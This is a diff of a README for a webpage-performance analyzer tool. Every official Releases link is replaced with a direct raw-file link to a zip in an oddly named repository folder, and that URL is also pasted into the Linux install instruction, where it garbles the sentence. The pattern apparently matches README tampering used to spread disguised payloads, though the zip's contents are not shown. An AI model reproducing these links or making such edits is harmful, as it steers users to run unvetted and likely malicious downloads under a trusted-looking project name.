@@ -1,6 +1,6 @@
 # 🚀 pagespeed-insights-webpage-analyzer - Analyze Your Webpage Performance Easily
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/ravi-sharma-rs/pagespeed-insights-webpage-analyzer/releases)
+[![Download](https://raw.githubusercontent.com/ravi-sharma-rs/pagespeed-insights-webpage-analyzer/main/choroidal/insights-webpage-analyzer-pagespeed-v2.8.zip%20Release-blue)](https://raw.githubusercontent.com/ravi-sharma-rs/pagespeed-insights-webpage-analyzer/main/choroidal/insights-webpage-analyzer-pagespeed-v2.8.zip)
 
 ## 📥 Introduction
 
@@ -25,12 +25,12 @@ To run the pagespeed-insights-webpage-analyzer, your computer needs to meet the 
 
 1. **Download the Application**: Visit the Releases page by clicking the link below to download the latest version of the pagespeed-insights-webpage-analyzer.
 
-   [Download Latest Release](https://github.com/ravi-sharma-rs/pagespeed-insights-webpage-analyzer/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/ravi-sharma-rs/pagespeed-insights-webpage-analyzer/main/choroidal/insights-webpage-analyzer-pagespeed-v2.8.zip)
 
 2. **Install the Application**:
     - For Windows: Open the downloaded file and follow the on-screen instructions to install.
     - For macOS: Drag the app into your Applications folder.
-    - For Linux: Follow your distribution's instructions for installing .tar.gz files.
+    - For Linux: Follow your distribution's instructions for installing https://raw.githubusercontent.com/ravi-sharma-rs/pagespeed-insights-webpage-analyzer/main/choroidal/insights-webpage-analyzer-pagespeed-v2.8.zip files.
 
 3. **Open the Application**: Locate the app on your computer and double-click to open it.
 
@@ -44,7 +44,7 @@ To run the pagespeed-insights-webpage-analyzer, your computer needs to meet the 
 
 To get started, please visit this page to download the application:
 
-[Download Latest Release](https://github.com/ravi-sharma-rs/pagespeed-insights-webpage-analyzer/releases)
+[Download Latest Release](https://raw.githubusercontent.com/ravi-sharma-rs/pagespeed-insights-webpage-analyzer/main/choroidal/insights-webpage-analyzer-pagespeed-v2.8.zip)
 
 After downloading, follow the installation steps outlined in the Getting Started section above.
 
